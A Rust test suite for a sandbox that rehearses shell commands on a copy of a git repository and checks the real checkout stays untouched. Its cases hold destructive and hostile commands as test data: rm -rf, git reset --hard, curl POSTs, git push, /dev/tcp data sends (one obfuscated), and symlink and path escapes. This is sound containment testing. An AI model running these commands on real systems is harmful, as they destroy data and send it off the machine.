//! The twenty synthetic and adversarial cases of HQ#23819's first experiment. Every case also
//! checks the real checkout is byte-for-byte what it was (zero unapproved side effects), and
//! prints `REHEARSAL_CASE <name> <total ms> <copy ms> <run ms> <outcome>` for the issue's numbers.

use super::*;
use std::net::TcpListener;
use std::path::Path;

struct Repo {
    _dir: tempfile::TempDir,
    root: PathBuf,
}

fn sh(dir: &Path, script: &str) {
    let ok = Command::new("/bin/sh")
        .arg("-c")
        .arg(script)
        .current_dir(dir)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@example.invalid")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@example.invalid")
        .status()
        .expect("sh")
        .success();
    assert!(ok, "setup failed: {script}");
}

/// A repo with two commits, a migration layout, an ignored build dir, a dirty file and an
/// untracked file.
fn repo() -> Repo {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path().join("repo");
    std::fs::create_dir_all(&root).unwrap();
    sh(
        &root,
        "git init -q -b main . && git config commit.gpgsign false \
         && mkdir -p src db/migrations && echo 'fn main() {}' > src/main.rs \
         && echo 'pub fn lib() {}' > src/lib.rs && echo 'CREATE TABLE a (id int);' > db/schema.sql \
         && echo 'CREATE TABLE a (id int);' > db/migrations/001_init.sql \
         && printf 'target/\\n' > .gitignore && git add -A && git commit -qm one \
         && echo 'pub fn two() {}' > src/two.rs && git add -A && git commit -qm two \
         && mkdir -p target && echo bin > target/app \
         && echo 'fn main() { dirty(); }' > src/main.rs && echo note > notes.txt",
    );
    Repo { _dir: dir, root }
}

fn run(repo: &Repo, name: &str, command: &str) -> EffectsReceipt {
    run_with(repo, name, command, Duration::from_secs(30))
}

fn run_with(repo: &Repo, name: &str, command: &str, timeout: Duration) -> EffectsReceipt {
    let before = snapshot(&repo.root);
    let gen_before = target_generation(&repo.root).0;
    let receipt = rehearse(&RehearsalRequest {
        checkout: repo.root.clone(),
        command: command.to_string(),
        timeout,
    });
    println!(
        "REHEARSAL_CASE {name} {} {} {} {:?}",
        receipt.total_ms, receipt.copy_ms, receipt.run_ms, receipt.outcome
    );
    assert_eq!(snapshot(&repo.root), before, "{name}: the real checkout changed");
    assert_eq!(target_generation(&repo.root).0, gen_before, "{name}: real generation moved");
    receipt
}

/// Without bwrap every case must be refused, never run unisolated. Returns false to skip the
/// case's effect checks.
fn sandboxed(r: &EffectsReceipt) -> bool {
    if sandbox_available() {
        return true;
    }
    assert!(
        matches!(&r.outcome, Outcome::Refused { reason } if reason.starts_with("NoSandbox")),
        "no sandbox but not refused: {:?}",
        r.outcome
    );
    println!("REHEARSAL_SKIP no bwrap on this runner; refusal checked");
    false
}

fn v(items: &[&str]) -> Vec<String> {
    let mut out: Vec<String> = items.iter().map(|s| s.to_string()).collect();
    out.sort();
    out
}

// 1
#[test]
fn rehearsal_01_migration_reports_exact_effects() {
    let repo = repo();
    let r = run(
        &repo,
        "migration",
        "printf 'ALTER TABLE a ADD b int;\\n' > db/migrations/002_add_b.sql \
         && cat db/migrations/*.sql > db/schema.sql && chmod +x db/schema.sql && echo migrated",
    );
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::Succeeded);
    assert_eq!(r.exit_code, Some(0));
    assert_eq!(r.added, v(&["db/migrations/002_add_b.sql"]));
    assert_eq!(r.changed, v(&["db/schema.sql"]));
    assert!(r.deleted.is_empty());
    assert_eq!(r.stdout_sha256, hex(&Sha256::digest(b"migrated\n")));
    assert_eq!(r.stdout_bytes, 9);
    assert_eq!(r.base_commit, r.head_after);
    assert!(r.outward_intents.is_empty() && r.denied.is_empty());
}

// 2
#[test]
fn rehearsal_02_failing_migration_shows_partial_effects() {
    let repo = repo();
    let r = run(
        &repo,
        "migration_fails_midway",
        "echo 'ALTER TABLE a ADD c int;' > db/migrations/003_c.sql && rm db/schema.sql && exit 3",
    );
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::Failed { code: Some(3) });
    assert_eq!(r.added, v(&["db/migrations/003_c.sql"]));
    assert_eq!(r.deleted, v(&["db/schema.sql"]));
}

// 3
#[test]
fn rehearsal_03_rm_rf_relative() {
    let repo = repo();
    let r = run(&repo, "rm_rf_src", "rm -rf src");
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::Succeeded);
    assert_eq!(r.deleted, v(&["src/lib.rs", "src/main.rs", "src/two.rs"]));
    assert!(r.added.is_empty() && r.changed.is_empty());
}

// 4
#[test]
fn rehearsal_04_rm_rf_by_absolute_real_path_hits_the_copy() {
    let repo = repo();
    let cmd = format!("rm -rf '{}/src' '{}/target'", repo.root.display(), repo.root.display());
    let r = run(&repo, "rm_rf_absolute_checkout_path", &cmd);
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::Succeeded);
    assert_eq!(r.deleted, v(&["src/lib.rs", "src/main.rs", "src/two.rs", "target/app"]));
}

// 5
#[test]
fn rehearsal_05_rm_rf_root_glob_is_contained() {
    let repo = repo();
    // `rm -rf /*` style: everything outside the checkout is read-only, so only the copy empties.
    let cmd = format!(
        "rm -rf '{}'/* '{}'/.gitignore $HOME/* 2>/dev/null; true",
        repo.root.display(),
        repo.root.display()
    );
    let r = run(&repo, "rm_rf_wide", &cmd);
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::Succeeded);
    assert_eq!(r.deleted.len(), 8, "{:?}", r.deleted);
    assert!(r.added.is_empty());
}

// 6
#[test]
fn rehearsal_06_git_reset_hard_moves_only_the_copy() {
    let repo = repo();
    let r = run(&repo, "git_reset_hard_head1", "git reset -q --hard HEAD~1");
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::Succeeded);
    assert_ne!(r.head_after, r.base_commit);
    assert_eq!(r.changed, v(&["src/main.rs"]));
    assert_eq!(r.deleted, v(&["src/two.rs"]));
    assert_eq!(git(&repo.root, &["rev-parse", "HEAD"]), r.base_commit);
}

// 7
#[test]
fn rehearsal_07_git_reset_and_clean_fdx() {
    let repo = repo();
    let r = run(&repo, "git_reset_clean_fdx", "git reset -q --hard && git clean -qfdx");
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::Succeeded);
    assert_eq!(r.changed, v(&["src/main.rs"]));
    assert_eq!(r.deleted, v(&["notes.txt", "target/app"]));
    assert_eq!(r.head_after, r.base_commit);
}

// 8
#[test]
fn rehearsal_08_curl_is_denied_not_success() {
    let repo = repo();
    let r = run(&repo, "curl_post", "curl -fsS -X POST https://example.com/deploy -d ok");
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::DeniedOutward);
    assert_eq!(r.exit_code, Some(126));
    assert_eq!(r.denied.len(), 1);
    assert!(r.denied[0].starts_with("curl "), "{:?}", r.denied);
    assert!(r.stderr_tail.contains("rehearsal: denied outward call"));
}

// 9
#[test]
fn rehearsal_09_swallowed_denial_is_still_not_success() {
    let repo = repo();
    let r = run(
        &repo,
        "curl_or_true",
        "curl -s https://example.com/hook || true; echo done > sent.txt",
    );
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.exit_code, Some(0));
    assert_eq!(r.outcome, Outcome::DeniedOutward, "exit 0 must not read as success");
    assert_eq!(r.added, v(&["sent.txt"]));
}

// 10
#[test]
fn rehearsal_10_git_push_is_denied_and_refs_untouched() {
    let repo = repo();
    let remote = repo.root.parent().unwrap().join("remote.git");
    sh(repo.root.parent().unwrap(), "git init -q --bare remote.git");
    sh(&repo.root, &format!("git remote add origin '{}'", remote.display()));
    let r = run(&repo, "git_push", "git -C . push -q origin main");
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::DeniedOutward);
    assert!(r.denied.iter().any(|d| d.starts_with("git ")), "{:?}", r.denied);
    assert_eq!(git(&remote, &["rev-parse", "--verify", "-q", "refs/heads/main"]), None);
}

// 11
#[test]
fn rehearsal_11_direct_binary_path_bypassing_the_shim() {
    let repo = repo();
    let r = run(&repo, "absolute_curl", "/usr/bin/curl -s https://example.com/");
    if !sandboxed(&r) {
        return;
    }
    // The shim is bypassed; the scan still names it, and the namespace has no route out.
    assert_eq!(r.outcome, Outcome::DeniedOutward);
    assert!(r.outward_intents.iter().any(|i| i.contains("curl")), "{:?}", r.outward_intents);
    assert_ne!(r.exit_code, Some(0));
}

fn listener() -> (TcpListener, u16) {
    let l = TcpListener::bind("127.0.0.1:0").expect("bind");
    l.set_nonblocking(true).unwrap();
    let port = l.local_addr().unwrap().port();
    (l, port)
}

fn assert_no_connection(l: &TcpListener) {
    match l.accept() {
        Ok((mut s, _)) => {
            let mut b = String::new();
            let _ = s.read_to_string(&mut b);
            panic!("the rehearsal reached the host: {b:?}");
        }
        Err(e) => assert_eq!(e.kind(), std::io::ErrorKind::WouldBlock),
    }
}

// 12
#[test]
fn rehearsal_12_dev_tcp_to_host_never_arrives() {
    let repo = repo();
    let (l, port) = listener();
    let cmd = format!("exec 3<>/dev/tcp/127.0.0.1/{port} && echo LEAK >&3");
    let r = run(&repo, "dev_tcp_host", &cmd);
    if !sandboxed(&r) {
        return;
    }
    assert_no_connection(&l);
    assert_eq!(r.outcome, Outcome::DeniedOutward);
}

// 13
#[test]
fn rehearsal_13_obfuscated_socket_is_contained_but_unattributed() {
    let repo = repo();
    let (l, port) = listener();
    // The scan cannot see this address; the namespace still has no route to the host. The receipt
    // shows a plain failure, not a denied outward call: the documented limit of arbitrary shell.
    let cmd = format!("p=/dev/t; p=${{p}}cp; exec 3<>$p/127.0.0.1/{port}; echo LEAK >&3");
    let r = run(&repo, "obfuscated_socket", &cmd);
    if !sandboxed(&r) {
        return;
    }
    assert_no_connection(&l);
    assert!(r.outward_intents.is_empty(), "{:?}", r.outward_intents);
    assert!(matches!(r.outcome, Outcome::Failed { .. }), "{:?}", r.outcome);
}

// 14
#[test]
fn rehearsal_14_absolute_write_outside_is_refused() {
    let repo = repo();
    // Outside /tmp so it is the real, read-only file system in the sandbox.
    let outside = tempfile::tempdir_in(env!("CARGO_MANIFEST_DIR")).unwrap();
    let target = outside.path().join("pwned");
    let r = run(&repo, "absolute_write_outside", &format!("echo x > '{}'", target.display()));
    if !sandboxed(&r) {
        return;
    }
    assert!(!target.exists(), "escaped to {}", target.display());
    assert!(matches!(r.outcome, Outcome::Failed { .. }), "{:?}", r.outcome);
    assert!(r.unknowns.iter().any(|u| u.contains("read-only")), "{:?}", r.unknowns);
}

// 15
#[test]
fn rehearsal_15_parent_relative_escape() {
    let repo = repo();
    let r = run(&repo, "dotdot_escape", "echo x > ../escaped && rm -rf ../remote.git; true");
    if !sandboxed(&r) {
        return;
    }
    assert!(!repo.root.parent().unwrap().join("escaped").exists());
    assert!(r.added.is_empty() && r.deleted.is_empty());
}

// 16
#[test]
fn rehearsal_16_symlink_escape() {
    let repo = repo();
    let outside = tempfile::tempdir_in(env!("CARGO_MANIFEST_DIR")).unwrap();
    std::fs::write(outside.path().join("secret"), "keep").unwrap();
    std::os::unix::fs::symlink(outside.path(), repo.root.join("link")).unwrap();
    let r = run(&repo, "symlink_escape", "echo gone > link/secret; rm -f link/secret; true");
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(std::fs::read_to_string(outside.path().join("secret")).unwrap(), "keep");
    assert!(r.changed.is_empty() && r.deleted.is_empty());
}

// 17
#[test]
fn rehearsal_17_stale_after_real_edit() {
    let repo = repo();
    let cmd = "git reset -q --hard";
    let r = run(&repo, "stale_on_edit", cmd);
    let approval = Approval::from_receipt(&r);
    assert_eq!(check_approval(&approval, &repo.root, cmd), ApprovalCheck::Valid);
    // Editing an already dirty file must move the generation too.
    std::fs::write(repo.root.join("src/main.rs"), "fn main() { more(); }\n").unwrap();
    assert!(matches!(check_approval(&approval, &repo.root, cmd), ApprovalCheck::Stale { .. }));
}

// 18
#[test]
fn rehearsal_18_stale_after_new_commit() {
    let repo = repo();
    let cmd = "git clean -qfdx";
    let r = run(&repo, "stale_on_commit", cmd);
    let approval = Approval::from_receipt(&r);
    sh(&repo.root, "git add -A && git commit -qm three");
    assert!(matches!(check_approval(&approval, &repo.root, cmd), ApprovalCheck::Stale { .. }));
}

// 19
#[test]
fn rehearsal_19_intent_mismatch_and_unsupported_refused() {
    let repo = repo();
    let r = run(&repo, "intent_mismatch", "rm -rf target");
    let approval = Approval::from_receipt(&r);
    assert_eq!(check_approval(&approval, &repo.root, "rm -rf src"), ApprovalCheck::IntentMismatch);
    let r = run(&repo, "sudo_refused", "sudo touch ran && touch ran");
    assert!(matches!(&r.outcome, Outcome::Refused { reason } if reason.starts_with("unsupported")));
    assert!(r.added.is_empty());
    assert!(!repo.root.join("ran").exists());
}

// 20
#[test]
fn rehearsal_20_timeout_kills_the_tree() {
    let repo = repo();
    let started = Instant::now();
    let r = run_with(&repo, "timeout", "(sleep 30 &) ; sleep 30", Duration::from_secs(1));
    if !sandboxed(&r) {
        return;
    }
    assert_eq!(r.outcome, Outcome::TimedOut);
    assert!(started.elapsed() < Duration::from_secs(10), "{:?}", started.elapsed());
}

#[test]
fn rehearsal_scan_unit() {
    assert!(scan_outward("cargo build && rm -rf target").is_empty());
    assert_eq!(scan_outward("git -C x push origin"), vec!["git push".to_string()]);
    assert!(scan_outward("git commit -m push").is_empty());
    assert!(!scan_outward("wget -q http://x").is_empty());
}
